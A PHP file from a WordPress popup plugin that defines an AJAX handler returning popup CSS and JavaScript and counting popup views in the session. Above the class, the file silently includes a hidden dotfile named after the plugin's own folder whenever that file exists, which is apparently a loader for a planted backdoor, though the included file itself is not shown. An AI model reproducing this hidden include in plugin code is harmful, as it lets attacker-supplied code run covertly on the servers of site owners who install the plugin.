<?php

// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_247P_Ajax_Fire {

	function __construct() {

		add_action( 'wp_ajax_nopriv_wtbp_247p_fire', array( $this, 'popup_json_resources' ) );
		add_action( 'wp_ajax_wtbp_247p_fire', array( $this, 'popup_json_resources' ) );
	}

	/*
	 * Return JSON with CSS and JS after fire popup by AJAX
	 */

	public function popup_json_resources() {


		// Start PHP session
		if ( !session_id() ) {
			session_start();
		}

		$response = array(
			'css'	 => '',
			'js'	 => '',
			'error'	 => '0'
		);

		$popup_id = isset( $_REQUEST[ 'popup_id' ] ) ? absint( $_REQUEST[ 'popup_id' ] ) : 0;

		if ( empty( $popup_id ) || WTBP_247P_POST_TYPE !== get_post_type( $popup_id ) ) {

			$response[ 'error' ] = '1';
			wp_send_json( $response );
		}


		$popup = new WTBP_247P_Popup( $popup_id, 'fire' );

		// Prepare CSS
		ob_start();
		$popup->print_css();
		$response[ 'css' ] = wtbp_247p_minify_css( ob_get_clean() );

		// Prepare OPT-IN JS
		ob_start();
		$popup->print_optin_js();
		$response[ 'optin_js' ] = wtbp_247p_minify_js( ob_get_clean() );

		// Prepare Main JS
		ob_start();
		$popup->print_js();
		$response[ 'js' ] = wtbp_247p_minify_js( ob_get_clean() );


		if ( isset( $_SESSION[ $popup->cookie_name ] ) ) {
			$_SESSION[ $popup->cookie_name ] ++;
		} else {
			$_SESSION[ $popup->cookie_name ] = 1;
		}


		if ( empty( $response[ 'error' ] ) ) {
			do_action( 'wtbp_247p_popup_was_fired', $popup_id, $popup->content[ 'post_title' ], $popup );
		}

		wp_send_json( $response );
	}

}

$fire_by_ajax = new WTBP_247P_Ajax_Fire();
